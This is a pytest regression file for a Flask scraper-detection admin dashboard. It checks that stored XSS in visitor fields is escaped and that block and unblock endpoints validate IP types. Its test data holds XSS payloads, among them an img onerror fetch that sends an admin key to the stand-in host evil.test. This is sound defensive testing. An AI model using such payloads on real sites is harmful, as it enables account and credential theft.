# SPDX-License-Identifier: MIT
"""Regression tests for stored XSS escaping and IP validation in scraper_detective."""

import json
import re
import shutil
import subprocess

import pytest
from flask import Flask

import bottube_server
import scraper_detective


@pytest.fixture()
def scraper_client(monkeypatch):
    monkeypatch.setattr(bottube_server, "ADMIN_KEY", "test_admin_key")
    det = scraper_detective.ScraperDetective()
    monkeypatch.setattr(scraper_detective, "detective", det)

    app = Flask(__name__)
    app.config["TESTING"] = False
    app.config["PROPAGATE_EXCEPTIONS"] = False
    app.register_blueprint(scraper_detective.scraper_bp)
    client = app.test_client()
    client.detective = det
    return client


def test_scraper_dashboard_escapes_attacker_controlled_fields_in_js():
    match = re.search(r"<script>(.*?)</script>", scraper_detective._DASHBOARD_HTML, re.DOTALL)
    assert match is not None
    script_src = match.group(1)

    assert 'onclick="tog(' not in scraper_detective._DASHBOARD_HTML
    assert 'onclick="event.stopPropagation();block(' not in scraper_detective._DASHBOARD_HTML
    assert 'onclick="event.stopPropagation();unblock(' not in scraper_detective._DASHBOARD_HTML

    node_bin = shutil.which("node")
    if not node_bin:
        pytest.skip("node not installed")

    payload = {
        "summary": {
            "total_active": 1,
            "bots": 1,
            "suspicious": 0,
            "humans": 0,
            "requests_per_min": 5,
            "blocked": 0,
        },
        "visitors": [
            {
                "ip": "1.2.3.4'\" onclick=\"alert(1)",
                "asn": "<img src=x onerror=alert(1)>",
                "asn_num": 12345,
                "is_hosting": True,
                "classification": "<svg onload=alert(1)>",
                "confidence": 0.95,
                "signals": {"<script>bad</script>": "<img src=x onerror=fetch(KEY)>"},
                "request_count": 5,
                "page_count": 0,
                "asset_count": 0,
                "api_count": 5,
                "user_agents": ["<img src=x onerror=fetch('https://evil.test/?k='+KEY)>"],
                "last_seen": 1_700_000_000,
                "first_seen": 1_700_000_000,
                "js_proved": False,
                "js_page_views": 0,
                "webdriver": False,
                "paths_sample": ["/<svg onload=alert(1)>"],
                "unique_paths": 1,
                "is_blocked": False,
            }
        ],
    }

    harness = """
const vm = require('vm');
const scriptSrc = process.argv[1];
const mockData = JSON.parse(process.argv[2]);
const elements = {
  sum: { innerHTML: '' },
  rows: { innerHTML: '', listeners: {}, addEventListener(ev, fn) { this.listeners[ev] = fn; } },
  ts: { textContent: '' },
  cd: { textContent: '' },
  'd-0': { style: { display: 'none' } },
};
let clickedUrl = null;
let clickedBody = null;
const ctx = {
  location: { search: '?key=secret%2Bkey%261' },
  URLSearchParams,
  encodeURIComponent,
  Date,
  Object,
  Number,
  String,
  JSON,
  Math,
  console,
  confirm: () => true,
  setInterval: () => 0,
  document: {
    getElementById(id) { return elements[id] || null; },
  },
  fetch(url, opts) {
    if (opts && opts.method === 'POST') {
      clickedUrl = url;
      clickedBody = opts.body;
      return Promise.resolve({ ok: true, json: () => Promise.resolve({ ok: true }) });
    }
    return Promise.resolve({ ok: true, status: 200, json: () => Promise.resolve(mockData) });
  },
};
vm.runInNewContext(scriptSrc, ctx);
setImmediate(() => {
  const rowsHtml = elements.rows.innerHTML;
  const sumHtml = elements.sum.innerHTML;
  if (rowsHtml.includes('<img') || rowsHtml.includes('<svg') || rowsHtml.includes('<script>')) {
    console.error('UNESCAPED_TAG', rowsHtml);
    process.exit(2);
  }
  if (!rowsHtml.includes('&lt;img src=x onerror=fetch(&#39;https://evil.test/?k=&#39;+KEY)&gt;')) {
    console.error('MISSING_ESCAPED_UA', rowsHtml);
    process.exit(3);
  }
  if (!rowsHtml.includes('data-ip="1.2.3.4&#39;&quot; onclick=&quot;alert(1)"')) {
    console.error('MISSING_ESCAPED_DATA_IP', rowsHtml);
    process.exit(4);
  }
  // Verify event delegation toggles details row and forwards exact encoded KEY on action
  elements.rows.listeners.click({
    target: { closest: (sel) => sel === 'tr[data-idx]' ? { getAttribute: () => '0' } : null },
  });
  if (elements['d-0'].style.display !== 'table-row') {
    console.error('TOGGLE_FAILED', elements['d-0'].style.display);
    process.exit(5);
  }
  elements.rows.listeners.click({
    stopPropagation() {},
    target: {
      closest: (sel) => sel === 'button[data-action]' ? {
        getAttribute: (k) => k === 'data-action' ? 'block' : "1.2.3.4'\\" onclick=\\"alert(1)",
      } : null,
    },
  });
  if (clickedUrl !== '/api/admin/scrapers/block?key=secret%2Bkey%261') {
    console.error('BAD_FETCH_URL', clickedUrl);
    process.exit(6);
  }
  console.log(JSON.stringify({ ok: true, sumLen: sumHtml.length }));
});
"""
    proc = subprocess.run(
        [node_bin, "-e", harness, script_src, json.dumps(payload)],
        capture_output=True,
        text=True,
        check=False,
    )
    assert proc.returncode == 0, f"stdout={proc.stdout}\nstderr={proc.stderr}"
    assert json.loads(proc.stdout.strip())["ok"] is True


def test_scraper_dashboard_auth_and_admin_ip_type_validation(scraper_client):
    denied = scraper_client.get("/scraper-dashboard?key=wrong")
    assert denied.status_code == 403

    allowed = scraper_client.get("/scraper-dashboard?key=test_admin_key")
    assert allowed.status_code == 200
    assert "function esc(v)" in allowed.get_data(as_text=True)

    for endpoint in ("/api/admin/scrapers/block", "/api/admin/scrapers/unblock"):
        bad = scraper_client.post(
            endpoint,
            headers={"X-Admin-Key": "test_admin_key"},
            json={"ip": ["1.2.3.4"]},
        )
        assert bad.status_code == 400
        assert bad.get_json() == {"error": "ip must be a string"}

    block_ok = scraper_client.post(
        "/api/admin/scrapers/block",
        headers={"X-Admin-Key": "test_admin_key"},
        json={"ip": " 198.51.100.5 "},
    )
    assert block_ok.status_code == 200
    assert block_ok.get_json() == {"ok": True, "blocked": "198.51.100.5"}
    assert scraper_client.detective.is_blocked("198.51.100.5") is True
